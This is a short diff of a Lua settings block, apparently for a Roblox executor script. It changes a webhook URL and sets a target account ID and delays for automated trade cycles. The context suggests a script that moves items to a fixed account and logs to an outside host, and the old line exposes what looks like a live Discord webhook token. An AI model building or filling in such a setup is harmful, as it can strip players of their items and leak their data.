@@ -1,5 +1,5 @@
 -- Настройки трейда
-getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1476518423554031790/UtSj1OVVjibvw6vZl-E_AihbEmEq_iMDl3nLkAASGo1gUDAzMP0OugsZW6ZKIUDc6Q58"
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_484a8e71958c4f36aca977e38b1d59ac"
 getgenv().TARGET_ID = 2813571178  -- ID аккаунта для трейда
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2 
